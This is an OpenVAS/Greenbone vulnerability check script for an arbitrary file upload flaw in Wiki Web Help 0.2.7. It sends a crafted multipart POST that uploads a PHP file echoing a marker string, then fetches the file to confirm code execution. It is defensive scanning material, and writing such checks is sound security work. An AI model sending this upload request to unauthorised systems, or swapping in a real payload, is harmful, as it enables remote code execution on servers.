# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:wikiwebhelp:wiki_web_help";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100702");
  script_version("2021-11-19T06:55:06+0000");
  script_tag(name:"last_modification", value:"2021-11-19 06:55:06 +0000 (Fri, 19 Nov 2021)");
  script_tag(name:"creation_date", value:"2010-07-06 13:44:35 +0200 (Tue, 06 Jul 2010)");
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Wiki Web Help <= 0.2.7 Arbitrary File Upload Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wikiwebhelp_http_detect.nasl");
  script_mandatory_keys("wikiwebhelp/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Wiki Web Help is prone to an arbitrary-file-upload
  vulnerability because it fails to properly sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"An attacker may leverage this issue to upload arbitrary files to
  the affected computer, this can result in arbitrary code execution within the context of the
  vulnerable application.");

  script_tag(name:"affected", value:"Wiki Web Help 0.2.7 is vulnerable, other versions may also be
  affected.");

  script_tag(name:"solution", value:"The vendor released a patch. Please see the references for
  more information.");

  script_xref(name:"URL", value:"http://sourceforge.net/tracker/?func=detail&atid=1296085&aid=3025530&group_id=307693");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

vt_strings = get_vt_strings();

host = http_host_name(port: port);

file = vt_strings["default_rand"] + ".php";

len = 175 + strlen(file);

req = string(
        "POST ", dir, "/handlers/uploadimage.php HTTP/1.1\r\n",
        "Content-Type: multipart/form-data; boundary=----x\r\n",
        "Host: ", host, "\r\n",
        "Content-Length: ", len,"\r\n",
        "Accept: text/html\r\n",
        "Accept-Encoding: gzip,deflate,sdch\r\n" ,
        "Accept-Language: en-US,en;q=0.8\r\n",
        "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n",
        "------x\r\n",
        'Content-Disposition: form-data; name="imagefile"; filename="', file , '"', "\r\n",
        "Content-Type: application/octet-stream\r\n\r\n",
        "<?php echo '<pre>", vt_strings["lowercase"], "</pre>'; ?>", "\r\n",
        "------x--\r\n\r\n");
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if ("{'response':'ok'}" >< res) {
  url = dir + "/images/" + file;

  if (http_vuln_check(port: port, url: url, pattern: vt_strings["lowercase"])) {
    report = string(
        "Note :\n\n",
        "## It was possible to upload and execute a file on the remote webserver.\n",
        "## The file is placed in directory: ", '"', dir, '/images/"', "\n",
        "## and is named: ", '"', file, '"', "\n",
        "## You should delete this file as soon as possible!\n" );
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
